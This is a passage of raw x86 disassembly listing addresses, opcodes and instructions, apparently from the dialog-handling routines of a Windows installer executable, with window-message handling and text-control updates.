  4041d5:	ff 15 3c 82 40 00    	call   *0x40823c
  4041db:	8b f8                	mov    %eax,%edi
  4041dd:	3b fd                	cmp    %ebp,%edi
  4041df:	74 1d                	je     0x4041fe
  4041e1:	55                   	push   %ebp
  4041e2:	55                   	push   %ebp
  4041e3:	68 f3 00 00 00       	push   $0xf3
  4041e8:	57                   	push   %edi
  4041e9:	ff 15 58 82 40 00    	call   *0x408258
  4041ef:	57                   	push   %edi
  4041f0:	ff 15 d8 81 40 00    	call   *0x4081d8
  4041f6:	85 c0                	test   %eax,%eax
  4041f8:	0f 84 d0 03 00 00    	je     0x4045ce
  4041fe:	83 fe 01             	cmp    $0x1,%esi
  404201:	75 03                	jne    0x404206
  404203:	56                   	push   %esi
  404204:	eb 2e                	jmp    0x404234
  404206:	83 fe 03             	cmp    $0x3,%esi
  404209:	75 0c                	jne    0x404217
  40420b:	39 2d 90 a3 40 00    	cmp    %ebp,0x40a390
  404211:	7e 3f                	jle    0x404252
  404213:	6a ff                	push   $0xffffffff
  404215:	eb 1d                	jmp    0x404234
  404217:	6a 02                	push   $0x2
  404219:	5f                   	pop    %edi
  40421a:	3b f7                	cmp    %edi,%esi
  40421c:	75 34                	jne    0x404252
  40421e:	39 2d ec 9a 42 00    	cmp    %ebp,0x429aec
  404224:	74 15                	je     0x40423b
  404226:	57                   	push   %edi
  404227:	e8 df d1 ff ff       	call   0x40140b
  40422c:	89 3d 18 17 42 00    	mov    %edi,0x421718
  404232:	6a 78                	push   $0x78
  404234:	e8 a1 03 00 00       	call   0x4045da
  404239:	eb 2d                	jmp    0x404268
  40423b:	6a 03                	push   $0x3
  40423d:	e8 c9 d1 ff ff       	call   0x40140b
  404242:	85 c0                	test   %eax,%eax
  404244:	75 22                	jne    0x404268
  404246:	c7 05 18 17 42 00 01 	movl   $0x1,0x421718
  40424d:	00 00 00 
  404250:	eb e0                	jmp    0x404232
  404252:	ff 74 24 30          	push   0x30(%esp)
  404256:	53                   	push   %ebx
  404257:	68 11 01 00 00       	push   $0x111
  40425c:	ff 35 38 8a 42 00    	push   0x428a38
  404262:	ff 15 58 82 40 00    	call   *0x408258
  404268:	ff 74 24 30          	push   0x30(%esp)
  40426c:	53                   	push   %ebx
  40426d:	ff 74 24 30          	push   0x30(%esp)
  404271:	e8 f2 03 00 00       	call   0x404668
  404276:	e9 55 03 00 00       	jmp    0x4045d0
  40427b:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  40427f:	8b 7c 24 24          	mov    0x24(%esp),%edi
  404283:	3b f1                	cmp    %ecx,%esi
  404285:	a3 30 2f 42 00       	mov    %eax,0x422f30
  40428a:	75 4d                	jne    0x4042d9
  40428c:	8b 35 3c 82 40 00    	mov    0x40823c,%esi
  404292:	6a 01                	push   $0x1
  404294:	57                   	push   %edi
  404295:	89 3d 68 9a 42 00    	mov    %edi,0x429a68
  40429b:	ff d6                	call   *%esi
  40429d:	6a 02                	push   $0x2
  40429f:	57                   	push   %edi
  4042a0:	a3 44 2f 42 00       	mov    %eax,0x422f44
  4042a5:	ff d6                	call   *%esi
  4042a7:	6a ff                	push   $0xffffffff
  4042a9:	6a 1c                	push   $0x1c
  4042ab:	57                   	push   %edi
  4042ac:	a3 10 0f 42 00       	mov    %eax,0x420f10
  4042b1:	e8 4b 03 00 00       	call   0x404601
  4042b6:	ff 35 48 8a 42 00    	push   0x428a48
  4042bc:	6a f2                	push   $0xfffffff2
  4042be:	57                   	push   %edi
  4042bf:	ff 15 dc 81 40 00    	call   *0x4081dc
  4042c5:	6a 04                	push   $0x4
  4042c7:	e8 3f d1 ff ff       	call   0x40140b
  4042cc:	a3 2c 8a 42 00       	mov    %eax,0x428a2c
  4042d1:	33 c0                	xor    %eax,%eax
  4042d3:	40                   	inc    %eax
  4042d4:	a3 30 2f 42 00       	mov    %eax,0x422f30
  4042d9:	8b 0d 90 a3 40 00    	mov    0x40a390,%ecx
  4042df:	33 ed                	xor    %ebp,%ebp
  4042e1:	8b f1                	mov    %ecx,%esi
  4042e3:	c1 e6 06             	shl    $0x6,%esi
  4042e6:	03 35 80 9a 42 00    	add    0x429a80,%esi
  4042ec:	3b cd                	cmp    %ebp,%ecx
  4042ee:	7c 3e                	jl     0x40432e
  4042f0:	83 f8 01             	cmp    $0x1,%eax
  4042f3:	75 31                	jne    0x404326
  4042f5:	55                   	push   %ebp
  4042f6:	ff 76 10             	push   0x10(%esi)
  4042f9:	e8 8b d0 ff ff       	call   0x401389
  4042fe:	85 c0                	test   %eax,%eax
  404300:	74 24                	je     0x404326
  404302:	6a 01                	push   $0x1
  404304:	55                   	push   %ebp
  404305:	68 0f 04 00 00       	push   $0x40f
  40430a:	ff 35 38 8a 42 00    	push   0x428a38
  404310:	ff 15 58 82 40 00    	call   *0x408258
  404316:	33 c0                	xor    %eax,%eax
  404318:	39 2d 2c 8a 42 00    	cmp    %ebp,0x428a2c
  40431e:	0f 94 c0             	sete   %al
  404321:	e9 aa 02 00 00       	jmp    0x4045d0
  404326:	39 2e                	cmp    %ebp,(%esi)
  404328:	0f 84 a0 02 00 00    	je     0x4045ce
  40432e:	68 0b 04 00 00       	push   $0x40b
  404333:	e8 15 03 00 00       	call   0x40464d
  404338:	a1 30 2f 42 00       	mov    0x422f30,%eax
  40433d:	01 05 90 a3 40 00    	add    %eax,0x40a390
  404343:	c1 e0 06             	shl    $0x6,%eax
  404346:	03 f0                	add    %eax,%esi
  404348:	a1 90 a3 40 00       	mov    0x40a390,%eax
  40434d:	3b 05 84 9a 42 00    	cmp    0x429a84,%eax
  404353:	75 07                	jne    0x40435c
  404355:	6a 01                	push   $0x1
  404357:	e8 af d0 ff ff       	call   0x40140b
  40435c:	39 2d 2c 8a 42 00    	cmp    %ebp,0x428a2c
  404362:	0f 85 24 02 00 00    	jne    0x40458c
  404368:	a1 84 9a 42 00       	mov    0x429a84,%eax
  40436d:	39 05 90 a3 40 00    	cmp    %eax,0x40a390
  404373:	0f 83 13 02 00 00    	jae    0x40458c
  404379:	ff 76 24             	push   0x24(%esi)
  40437c:	8b 5e 14             	mov    0x14(%esi),%ebx
  40437f:	68 00 90 43 00       	push   $0x439000
  404384:	e8 36 23 00 00       	call   0x4066bf
  404389:	ff 76 20             	push   0x20(%esi)
  40438c:	68 19 fc ff ff       	push   $0xfffffc19
  404391:	57                   	push   %edi
  404392:	e8 6a 02 00 00       	call   0x404601
  404397:	ff 76 1c             	push   0x1c(%esi)
  40439a:	68 1b fc ff ff       	push   $0xfffffc1b
  40439f:	57                   	push   %edi
  4043a0:	e8 5c 02 00 00       	call   0x404601
  4043a5:	ff 76 28             	push   0x28(%esi)
  4043a8:	68 1a fc ff ff       	push   $0xfffffc1a
  4043ad:	57                   	push   %edi
  4043ae:	e8 4e 02 00 00       	call   0x404601
  4043b3:	6a 03                	push   $0x3
  4043b5:	57                   	push   %edi
  4043b6:	ff 15 3c 82 40 00    	call   *0x40823c
  4043bc:	39 2d ec 9a 42 00    	cmp    %ebp,0x429aec
  4043c2:	89 44 24 30          	mov    %eax,0x30(%esp)
  4043c6:	74 08                	je     0x4043d0
  4043c8:	66 81 e3 fd fe       	and    $0xfefd,%bx
  4043cd:	83 cb 04             	or     $0x4,%ebx
  4043d0:	8b cb                	mov    %ebx,%ecx
  4043d2:	83 e1 08             	and    $0x8,%ecx
  4043d5:	51                   	push   %ecx
  4043d6:	50                   	push   %eax
  4043d7:	ff 15 28 82 40 00    	call   *0x408228
  4043dd:	8b c3                	mov    %ebx,%eax
  4043df:	25 00 01 00 00       	and    $0x100,%eax
  4043e4:	50                   	push   %eax
  4043e5:	ff 74 24 34          	push   0x34(%esp)
  4043e9:	ff 15 50 82 40 00    	call   *0x408250
  4043ef:	8b c3                	mov    %ebx,%eax
  4043f1:	83 e0 02             	and    $0x2,%eax
  4043f4:	50                   	push   %eax
  4043f5:	e8 29 02 00 00       	call   0x404623
  4043fa:	83 e3 04             	and    $0x4,%ebx
  4043fd:	53                   	push   %ebx
  4043fe:	ff 35 10 0f 42 00    	push   0x420f10
  404404:	ff 15 50 82 40 00    	call   *0x408250
  40440a:	3b dd                	cmp    %ebp,%ebx
  40440c:	74 03                	je     0x404411
  40440e:	55                   	push   %ebp
  40440f:	eb 02                	jmp    0x404413
  404411:	6a 01                	push   $0x1
  404413:	68 60 f0 00 00       	push   $0xf060
  404418:	55                   	push   %ebp
  404419:	57                   	push   %edi
  40441a:	ff 15 e0 81 40 00    	call   *0x4081e0
  404420:	50                   	push   %eax
  404421:	ff 15 e4 81 40 00    	call   *0x4081e4
  404427:	8b 1d 58 82 40 00    	mov    0x408258,%ebx
  40442d:	6a 01                	push   $0x1
  40442f:	55                   	push   %ebp
  404430:	68 f4 00 00 00       	push   $0xf4
  404435:	ff 74 24 3c          	push   0x3c(%esp)
  404439:	ff d3                	call   *%ebx
  40443b:	39 2d ec 9a 42 00    	cmp    %ebp,0x429aec
  404441:	74 13                	je     0x404456
  404443:	55                   	push   %ebp
  404444:	6a 02                	push   $0x2
  404446:	68 01 04 00 00       	push   $0x401
  40444b:	57                   	push   %edi
  40444c:	ff d3                	call   *%ebx
  40444e:	ff 35 10 0f 42 00    	push   0x420f10
  404454:	eb 06                	jmp    0x40445c
  404456:	ff 35 44 2f 42 00    	push   0x422f44
  40445c:	e8 d5 01 00 00       	call   0x404636
  404461:	e8 7d fc ff ff       	call   0x4040e3
  404466:	bb 48 2f 42 00       	mov    $0x422f48,%ebx
  40446b:	50                   	push   %eax
  40446c:	53                   	push   %ebx
  40446d:	e8 10 22 00 00       	call   0x406682
  404472:	ff 76 18             	push   0x18(%esi)
  404475:	53                   	push   %ebx
  404476:	e8 1d 22 00 00       	call   0x406698
  40447b:	8d 04 45 48 2f 42 00 	lea    0x422f48(,%eax,2),%eax
  404482:	50                   	push   %eax
  404483:	e8 37 22 00 00       	call   0x4066bf
  404488:	53                   	push   %ebx
  404489:	57                   	push   %edi
  40448a:	ff 15 1c 82 40 00    	call   *0x40821c
  404490:	55                   	push   %ebp
  404491:	ff 76 08             	push   0x8(%esi)
  404494:	e8 f0 ce ff ff       	call   0x401389
  404499:	85 c0                	test   %eax,%eax
  40449b:	0f 85 97 fe ff ff    	jne    0x404338
  4044a1:	39 2e                	cmp    %ebp,(%esi)
  4044a3:	0f 84 8f fe ff ff    	je     0x404338
  4044a9:	83 7e 04 05          	cmpl   $0x5,0x4(%esi)
  4044ad:	75 1d                	jne    0x4044cc
  4044af:	39 2d ec 9a 42 00    	cmp    %ebp,0x429aec
  4044b5:	0f 85 13 01 00 00    	jne    0x4045ce
  4044bb:	39 2d e0 9a 42 00    	cmp    %ebp,0x429ae0
  4044c1:	0f 85 71 fe ff ff    	jne    0x404338
  4044c7:	e9 02 01 00 00       	jmp    0x4045ce
  4044cc:	ff 35 38 8a 42 00    	push   0x428a38
  4044d2:	ff 15 10 82 40 00    	call   *0x408210
  4044d8:	89 35 20 1f 42 00    	mov    %esi,0x421f20
  4044de:	39 2e                	cmp    %ebp,(%esi)
  4044e0:	0f 8e c5 00 00 00    	jle    0x4045ab
  4044e6:	8b 46 04             	mov    0x4(%esi),%eax
  4044e9:	56                   	push   %esi
  4044ea:	ff 34 85 94 a3 40 00 	push   0x40a394(,%eax,4)
  4044f1:	66 8b 06             	mov    (%esi),%ax
  4044f4:	66 03 05 40 8a 42 00 	add    0x428a40,%ax
  4044fb:	57                   	push   %edi
  4044fc:	0f b7 c0             	movzwl %ax,%eax
  4044ff:	50                   	push   %eax
  404500:	ff 35 60 9a 42 00    	push   0x429a60
  404506:	ff 15 14 82 40 00    	call   *0x408214
  40450c:	3b c5                	cmp    %ebp,%eax
  40450e:	a3 38 8a 42 00       	mov    %eax,0x428a38
  404513:	0f 84 92 00 00 00    	je     0x4045ab
  404519:	ff 76 2c             	push   0x2c(%esi)
  40451c:	6a 06                	push   $0x6
  40451e:	50                   	push   %eax
  40451f:	e8 dd 00 00 00       	call   0x404601
  404524:	8d 44 24 10          	lea    0x10(%esp),%eax
  404528:	50                   	push   %eax
  404529:	68 fa 03 00 00       	push   $0x3fa
  40452e:	57                   	push   %edi
  40452f:	ff 15 3c 82 40 00    	call   *0x40823c
  404535:	50                   	push   %eax
  404536:	ff 15 e8 81 40 00    	call   *0x4081e8
  40453c:	8d 44 24 10          	lea    0x10(%esp),%eax
  404540:	50                   	push   %eax
  404541:	57                   	push   %edi
  404542:	ff 15 ec 81 40 00    	call   *0x4081ec
  404548:	6a 15                	push   $0x15
  40454a:	55                   	push   %ebp
  40454b:	55                   	push   %ebp
  40454c:	ff 74 24 20          	push   0x20(%esp)
  404550:	ff 74 24 20          	push   0x20(%esp)
  404554:	55                   	push   %ebp
  404555:	ff 35 38 8a 42 00    	push   0x428a38
  40455b:	ff 15 d0 81 40 00    	call   *0x4081d0
  404561:	55                   	push   %ebp
  404562:	ff 76 0c             	push   0xc(%esi)
  404565:	e8 1f ce ff ff       	call   0x401389
  40456a:	39 2d 2c 8a 42 00    	cmp    %ebp,0x428a2c
  404570:	75 5c                	jne    0x4045ce
  404572:	6a 08                	push   $0x8
  404574:	ff 35 38 8a 42 00    	push   0x428a38
  40457a:	ff 15 28 82 40 00    	call   *0x408228
  404580:	68 05 04 00 00       	push   $0x405
  404585:	e8 c3 00 00 00       	call   0x40464d
  40458a:	eb 1f                	jmp    0x4045ab
  40458c:	ff 35 38 8a 42 00    	push   0x428a38
  404592:	ff 15 10 82 40 00    	call   *0x408210
  404598:	ff 35 18 17 42 00    	push   0x421718
  40459e:	89 2d 68 9a 42 00    	mov    %ebp,0x429a68
  4045a4:	57                   	push   %edi
  4045a5:	ff 15 f0 81 40 00    	call   *0x4081f0
  4045ab:	39 2d 48 4f 42 00    	cmp    %ebp,0x424f48
  4045b1:	75 1b                	jne    0x4045ce
  4045b3:	39 2d 38 8a 42 00    	cmp    %ebp,0x428a38
  4045b9:	74 13                	je     0x4045ce
  4045bb:	6a 0a                	push   $0xa
  4045bd:	57                   	push   %edi
  4045be:	ff 15 28 82 40 00    	call   *0x408228
  4045c4:	c7 05 48 4f 42 00 01 	movl   $0x1,0x424f48
  4045cb:	00 00 00 
  4045ce:	33 c0                	xor    %eax,%eax
  4045d0:	5f                   	pop    %edi
  4045d1:	5e                   	pop    %esi
  4045d2:	5d                   	pop    %ebp
  4045d3:	5b                   	pop    %ebx
  4045d4:	83 c4 10             	add    $0x10,%esp
  4045d7:	c2 10 00             	ret    $0x10
  4045da:	83 7c 24 04 78       	cmpl   $0x78,0x4(%esp)
  4045df:	75 06                	jne    0x4045e7
  4045e1:	ff 05 2c 8a 42 00    	incl   0x428a2c
  4045e7:	6a 00                	push   $0x0
  4045e9:	ff 74 24 08          	push   0x8(%esp)
  4045ed:	68 08 04 00 00       	push   $0x408
  4045f2:	ff 35 68 9a 42 00    	push   0x429a68
  4045f8:	ff 15 58 82 40 00    	call   *0x408258
  4045fe:	c2 04 00             	ret    $0x4
  404601:	ff 74 24 0c          	push   0xc(%esp)
  404605:	6a 00                	push   $0x0
  404607:	e8 b3 20 00 00       	call   0x4066bf
  40460c:	50                   	push   %eax
  40460d:	8b 44 24 0c          	mov    0xc(%esp),%eax
  404611:	05 e8 03 00 00       	add    $0x3e8,%eax
  404616:	50                   	push   %eax
  404617:	ff 74 24 0c          	push   0xc(%esp)
  40461b:	e8 a0 16 00 00       	call   0x405cc0
  404620:	c2 0c 00             	ret    $0xc
  404623:	ff 74 24 04          	push   0x4(%esp)
  404627:	ff 35 44 2f 42 00    	push   0x422f44
  40462d:	ff 15 50 82 40 00    	call   *0x408250
  404633:	c2 04 00             	ret    $0x4
  404636:	6a 01                	push   $0x1
  404638:	ff 74 24 08          	push   0x8(%esp)
  40463c:	6a 28                	push   $0x28
  40463e:	ff 35 68 9a 42 00    	push   0x429a68
  404644:	ff 15 58 82 40 00    	call   *0x408258
  40464a:	c2 04 00             	ret    $0x4
  40464d:	a1 38 8a 42 00       	mov    0x428a38,%eax
  404652:	85 c0                	test   %eax,%eax
  404654:	74 0f                	je     0x404665
  404656:	6a 00                	push   $0x0
  404658:	6a 00                	push   $0x0
  40465a:	ff 74 24 0c          	push   0xc(%esp)
  40465e:	50                   	push   %eax
  40465f:	ff 15 58 82 40 00    	call   *0x408258
  404665:	c2 04 00             	ret    $0x4
  404668:	55                   	push   %ebp
  404669:	8b ec                	mov    %esp,%ebp
  40466b:	83 ec 0c             	sub    $0xc,%esp
  40466e:	8b 45 08             	mov    0x8(%ebp),%eax
  404671:	56                   	push   %esi
  404672:	05 cd fe ff ff       	add    $0xfffffecd,%eax
  404677:	83 f8 05             	cmp    $0x5,%eax
  40467a:	0f 87 b0 00 00 00    	ja     0x404730
  404680:	6a eb                	push   $0xffffffeb
  404682:	ff 75 10             	push   0x10(%ebp)
  404685:	ff 15 d4 81 40 00    	call   *0x4081d4
  40468b:	8b f0                	mov    %eax,%esi
  40468d:	85 f6                	test   %esi,%esi
  40468f:	0f 84 9b 00 00 00    	je     0x404730
  404695:	83 7e 08 01          	cmpl   $0x1,0x8(%esi)
  404699:	0f 87 91 00 00 00    	ja     0x404730
  40469f:	83 7e 10 02          	cmpl   $0x2,0x10(%esi)
  4046a3:	0f 87 87 00 00 00    	ja     0x404730
  4046a9:	8b 4e 14             	mov    0x14(%esi),%ecx
  4046ac:	f7 c1 e0 ff ff ff    	test   $0xffffffe0,%ecx
  4046b2:	75 7c                	jne    0x404730
  4046b4:	8b 06                	mov    (%esi),%eax
  4046b6:	57                   	push   %edi
  4046b7:	8b 3d cc 81 40 00    	mov    0x4081cc,%edi
  4046bd:	f6 c1 02             	test   $0x2,%cl
  4046c0:	74 03                	je     0x4046c5
  4046c2:	50                   	push   %eax
  4046c3:	ff d7                	call   *%edi
  4046c5:	f6 46 14 01          	testb  $0x1,0x14(%esi)
  4046c9:	74 0a                	je     0x4046d5
  4046cb:	50                   	push   %eax
  4046cc:	ff 75 0c             	push   0xc(%ebp)
  4046cf:	ff 15 64 80 40 00    	call   *0x408064
  4046d5:	ff 76 10             	push   0x10(%esi)
  4046d8:	ff 75 0c             	push   0xc(%ebp)
  4046db:	ff 15 60 80 40 00    	call   *0x408060
  4046e1:	8b 46 04             	mov    0x4(%esi),%eax
  4046e4:	f6 46 14 08          	testb  $0x8,0x14(%esi)
  4046e8:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4046eb:	74 06                	je     0x4046f3
  4046ed:	50                   	push   %eax
  4046ee:	ff d7                	call   *%edi
  4046f0:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4046f3:	f6 46 14 04          	testb  $0x4,0x14(%esi)
  4046f7:	5f                   	pop    %edi
  4046f8:	74 0a                	je     0x404704
  4046fa:	50                   	push   %eax
  4046fb:	ff 75 0c             	push   0xc(%ebp)
  4046fe:	ff 15 4c 80 40 00    	call   *0x40804c
  404704:	f6 46 14 10          	testb  $0x10,0x14(%esi)
  404708:	74 21                	je     0x40472b
  40470a:	8b 46 08             	mov    0x8(%esi),%eax
  40470d:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404710:	8b 46 0c             	mov    0xc(%esi),%eax
  404713:	85 c0                	test   %eax,%eax
  404715:	74 07                	je     0x40471e
  404717:	50                   	push   %eax
  404718:	ff 15 54 80 40 00    	call   *0x408054
  40471e:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404721:	50                   	push   %eax
  404722:	ff 15 58 80 40 00    	call   *0x408058
  404728:	89 46 0c             	mov    %eax,0xc(%esi)
  40472b:	8b 46 0c             	mov    0xc(%esi),%eax
  40472e:	eb 02                	jmp    0x404732
  404730:	33 c0                	xor    %eax,%eax
  404732:	5e                   	pop    %esi
  404733:	c9                   	leave
  404734:	c2 0c 00             	ret    $0xc
  404737:	55                   	push   %ebp
  404738:	8b ec                	mov    %esp,%ebp
  40473a:	8b 45 10             	mov    0x10(%ebp),%eax
  40473d:	8b 0d 14 0f 42 00    	mov    0x420f14,%ecx
  404743:	d1 e8                	shr    $1,%eax
  404745:	50                   	push   %eax
  404746:	8b 45 08             	mov    0x8(%ebp),%eax
  404749:	03 c8                	add    %eax,%ecx
  40474b:	51                   	push   %ecx
  40474c:	ff 75 0c             	push   0xc(%ebp)
  40474f:	ff 15 98 80 40 00    	call   *0x408098
  404755:	ff 75 0c             	push   0xc(%ebp)
  404758:	ff 15 9c 80 40 00    	call   *0x40809c
  40475e:	8b 4d 14             	mov    0x14(%ebp),%ecx
  404761:	03 c0                	add    %eax,%eax
  404763:	89 01                	mov    %eax,(%ecx)
  404765:	01 05 14 0f 42 00    	add    %eax,0x420f14
  40476b:	33 c0                	xor    %eax,%eax
  40476d:	5d                   	pop    %ebp
  40476e:	c2 10 00             	ret    $0x10
  404771:	55                   	push   %ebp
  404772:	8b ec                	mov    %esp,%ebp
  404774:	a1 14 0f 42 00       	mov    0x420f14,%eax
  404779:	56                   	push   %esi
  40477a:	8b 75 08             	mov    0x8(%ebp),%esi
  40477d:	8d 04 46             	lea    (%esi,%eax,2),%eax
  404780:	50                   	push   %eax
  404781:	ff 15 9c 80 40 00    	call   *0x40809c
  404787:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40478a:	d1 e9                	shr    $1,%ecx
  40478c:	3b c1                	cmp    %ecx,%eax
  40478e:	72 02                	jb     0x404792
  404790:	8b c1                	mov    %ecx,%eax
  404792:	33 c9                	xor    %ecx,%ecx
  404794:	51                   	push   %ecx
  404795:	51                   	push   %ecx
  404796:	ff 75 10             	push   0x10(%ebp)
  404799:	ff 75 0c             	push   0xc(%ebp)
  40479c:	50                   	push   %eax
  40479d:	a1 14 0f 42 00       	mov    0x420f14,%eax
  4047a2:	8d 04 46             	lea    (%esi,%eax,2),%eax
  4047a5:	50                   	push   %eax
  4047a6:	51                   	push   %ecx
  4047a7:	51                   	push   %ecx
  4047a8:	ff 15 94 80 40 00    	call   *0x408094
  4047ae:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4047b1:	5e                   	pop    %esi
  4047b2:	89 01                	mov    %eax,(%ecx)
  4047b4:	01 05 14 0f 42 00    	add    %eax,0x420f14
  4047ba:	33 c0                	xor    %eax,%eax
  4047bc:	5d                   	pop    %ebp
  4047bd:	c2 10 00             	ret    $0x10
  4047c0:	55                   	push   %ebp
  4047c1:	8b ec                	mov    %esp,%ebp
  4047c3:	83 ec 0c             	sub    $0xc,%esp
  4047c6:	53                   	push   %ebx
  4047c7:	33 db                	xor    %ebx,%ebx
  4047c9:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  4047d0:	56                   	push   %esi
  4047d1:	57                   	push   %edi
  4047d2:	0f 85 1a 01 00 00    	jne    0x4048f2
  4047d8:	8b 7d 14             	mov    0x14(%ebp),%edi
  4047db:	8b 47 30             	mov    0x30(%edi),%eax
  4047de:	3b c3                	cmp    %ebx,%eax
  4047e0:	7d 11                	jge    0x4047f3
  4047e2:	8b 0d 3c 8a 42 00    	mov    0x428a3c,%ecx
  4047e8:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  4047ef:	2b c8                	sub    %eax,%ecx
  4047f1:	8b 01                	mov    (%ecx),%eax
  4047f3:	8b 0d 98 9a 42 00    	mov    0x429a98,%ecx
  4047f9:	8d 04 41             	lea    (%ecx,%eax,2),%eax
  4047fc:	0f b7 08             	movzwl (%eax),%ecx
  4047ff:	40                   	inc    %eax
  404800:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  404803:	40                   	inc    %eax
  404804:	83 f9 02             	cmp    $0x2,%ecx
  404807:	89 45 14             	mov    %eax,0x14(%ebp)
  40480a:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40480d:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  404810:	c7 45 fc 71 47 40 00 	movl   $0x404771,-0x4(%ebp)
  404817:	74 07                	je     0x404820
  404819:	c7 45 fc 37 47 40 00 	movl   $0x404737,-0x4(%ebp)
  404820:	8b 47 14             	mov    0x14(%edi),%eax
  404823:	ff 77 34             	push   0x34(%edi)
  404826:	8b f0                	mov    %eax,%esi
  404828:	83 e0 01             	and    $0x1,%eax
  40482b:	f7 d6                	not    %esi
  40482d:	c1 ee 05             	shr    $0x5,%esi
  404830:	6a 22                	push   $0x22
  404832:	83 e6 01             	and    $0x1,%esi
  404835:	ff 75 08             	push   0x8(%ebp)
  404838:	0b f0                	or     %eax,%esi
  40483a:	e8 c2 fd ff ff       	call   0x404601
  40483f:	ff 77 38             	push   0x38(%edi)
  404842:	6a 23                	push   $0x23
  404844:	ff 75 08             	push   0x8(%ebp)
  404847:	e8 b5 fd ff ff       	call   0x404601
  40484c:	33 c0                	xor    %eax,%eax
  40484e:	3b f3                	cmp    %ebx,%esi
  404850:	0f 94 c0             	sete   %al
  404853:	05 0a 04 00 00       	add    $0x40a,%eax
  404858:	6a 01                	push   $0x1
  40485a:	50                   	push   %eax
  40485b:	ff 75 08             	push   0x8(%ebp)
  40485e:	ff 15 c0 81 40 00    	call   *0x4081c0
  404864:	56                   	push   %esi
  404865:	e8 b9 fd ff ff       	call   0x404623
  40486a:	68 e8 03 00 00       	push   $0x3e8
  40486f:	ff 75 08             	push   0x8(%ebp)
  404872:	ff 15 3c 82 40 00    	call   *0x40823c
  404878:	8b f8                	mov    %eax,%edi
  40487a:	57                   	push   %edi
  40487b:	e8 b6 fd ff ff       	call   0x404636
  404880:	8b 35 58 82 40 00    	mov    0x408258,%esi
  404886:	53                   	push   %ebx
  404887:	6a 01                	push   $0x1
  404889:	68 5b 04 00 00       	push   $0x45b
  40488e:	57                   	push   %edi
  40488f:	ff d6                	call   *%esi
  404891:	a1 70 9a 42 00       	mov    0x429a70,%eax
  404896:	8b 40 68             	mov    0x68(%eax),%eax
  404899:	3b c3                	cmp    %ebx,%eax
  40489b:	7d 09                	jge    0x4048a6
  40489d:	f7 d8                	neg    %eax
  40489f:	50                   	push   %eax
  4048a0:	ff 15 cc 81 40 00    	call   *0x4081cc
  4048a6:	50                   	push   %eax
  4048a7:	53                   	push   %ebx
  4048a8:	68 43 04 00 00       	push   $0x443
  4048ad:	57                   	push   %edi
  4048ae:	ff d6                	call   *%esi
  4048b0:	68 00 00 01 04       	push   $0x4010000
  4048b5:	53                   	push   %ebx
  4048b6:	68 45 04 00 00       	push   $0x445
  4048bb:	57                   	push   %edi
  4048bc:	ff d6                	call   *%esi
  4048be:	ff 75 14             	push   0x14(%ebp)
  4048c1:	e8 d2 1d 00 00       	call   0x406698
  4048c6:	50                   	push   %eax
  4048c7:	53                   	push   %ebx
  4048c8:	68 35 04 00 00       	push   $0x435
  4048cd:	57                   	push   %edi
  4048ce:	ff d6                	call   *%esi
  4048d0:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4048d3:	89 1d 14 0f 42 00    	mov    %ebx,0x420f14
  4048d9:	50                   	push   %eax
  4048da:	ff 75 0c             	push   0xc(%ebp)
  4048dd:	68 49 04 00 00       	push   $0x449
  4048e2:	57                   	push   %edi
  4048e3:	ff d6                	call   *%esi
  4048e5:	89 1d 14 0f 42 00    	mov    %ebx,0x420f14
  4048eb:	33 c0                	xor    %eax,%eax
  4048ed:	e9 52 01 00 00       	jmp    0x404a44
  4048f2:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  4048f9:	8b 35 58 82 40 00    	mov    0x408258,%esi
  4048ff:	75 5b                	jne    0x40495c
  404901:	8b 45 10             	mov    0x10(%ebp),%eax
  404904:	c1 e8 10             	shr    $0x10,%eax
  404907:	66 85 c0             	test   %ax,%ax
  40490a:	0f 85 25 01 00 00    	jne    0x404a35
  404910:	39 1d 14 0f 42 00    	cmp    %ebx,0x420f14
  404916:	0f 85 19 01 00 00    	jne    0x404a35
  40491c:	a1 20 1f 42 00       	mov    0x421f20,%eax
  404921:	8d 78 14             	lea    0x14(%eax),%edi
  404924:	f6 07 20             	testb  $0x20,(%edi)
  404927:	0f 84 08 01 00 00    	je     0x404a35
  40492d:	53                   	push   %ebx
  40492e:	53                   	push   %ebx
  40492f:	68 f0 00 00 00       	push   $0xf0
  404934:	68 0a 04 00 00       	push   $0x40a
  404939:	ff 75 08             	push   0x8(%ebp)
  40493c:	ff 15 3c 82 40 00    	call   *0x40823c
  404942:	50                   	push   %eax
  404943:	ff d6                	call   *%esi
  404945:	8b 0f                	mov    (%edi),%ecx
  404947:	83 e0 01             	and    $0x1,%eax
  40494a:	83 e1 fe             	and    $0xfffffffe,%ecx
  40494d:	50                   	push   %eax
  40494e:	0b c8                	or     %eax,%ecx
  404950:	89 0f                	mov    %ecx,(%edi)
  404952:	e8 cc fc ff ff       	call   0x404623
  404957:	e8 ef 00 00 00       	call   0x404a4b
  40495c:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  404960:	0f 85 c0 00 00 00    	jne    0x404a26
  404966:	68 e8 03 00 00       	push   $0x3e8
  40496b:	ff 75 08             	push   0x8(%ebp)
  40496e:	ff 15 3c 82 40 00    	call   *0x40823c
  404974:	8b 7d 14             	mov    0x14(%ebp),%edi
  404977:	81 7f 08 0b 07 00 00 	cmpl   $0x70b,0x8(%edi)
  40497e:	75 67                	jne    0x4049e7
  404980:	81 7f 0c 01 02 00 00 	cmpl   $0x201,0xc(%edi)
  404987:	75 5e                	jne    0x4049e7
  404989:	8b 4f 1c             	mov    0x1c(%edi),%ecx
  40498c:	8b 57 18             	mov    0x18(%edi),%edx
  40498f:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  404992:	2b ca                	sub    %edx,%ecx
  404994:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  40499a:	89 55 f4             	mov    %edx,-0xc(%ebp)
  40499d:	c7 45 fc 00 7a 42 00 	movl   $0x427a00,-0x4(%ebp)
  4049a4:	73 41                	jae    0x4049e7
